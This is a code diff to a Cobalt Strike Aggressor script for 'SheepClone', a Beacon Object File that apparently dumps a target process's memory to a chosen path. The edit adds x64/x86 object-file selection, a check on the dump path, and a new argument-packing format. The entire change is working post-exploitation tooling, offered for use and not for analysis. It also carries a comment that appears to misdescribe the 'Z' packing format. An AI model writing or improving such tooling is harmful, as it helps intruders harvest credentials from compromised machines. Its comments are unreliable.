@@ -1,7 +1,7 @@
 # SheepClone BOF Aggressor Script
 
 alias sheepclone {
-	local('$barch $handle $data $args $pid $dump_path');
+	local('$barch $handle $data $args $pid $dump_path $bof_file');
 
 	# Check if correct number of arguments is provided
 	if (size(@_) < 3) {
@@ -19,20 +19,31 @@ alias sheepclone {
 		return;
 	}
 
+	# Validate dump path (basic check for non-empty string)
+	if (strlen($dump_path) == 0) {
+		bprint($1, "Error: Dump path cannot be empty!");
+		return;
+	}
+
 	# Figure out the architecture of this session
 	$barch = barch($1);
+	if ($barch eq "x64") {
+		$bof_file = "sheepclone.x64.o";
+	} else {
+		$bof_file = "sheepclone.x86.o";
+	}
 
 	# Read in the BOF file based on architecture
-	$handle = openf(script_resource("sheepclone.x64.o"));
+	$handle = openf(script_resource($bof_file));
 	if ($handle eq $null) {
-		bprint($1, "Error: Failed to open BOF file 'sheepclone.x64.o'");
+		bprint($1, "Error: Failed to open BOF file '" . $bof_file . "'");
 		return;
 	}
 	$data = readb($handle, -1);
 	closef($handle);
 
-	# Pack arguments for BOF: PID (int) and dump path (string)
-	$args = bof_pack($1, "is", $pid, $dump_path);
+	# Pack arguments for BOF: PID (int) and dump path (null-terminated string)
+	$args = bof_pack($1, "iZ", $pid, $dump_path);
 
 	# Announce that we are running the BOF
 	btask($1, "Running SheepClone BOF with PID $pid and dump path $dump_path");
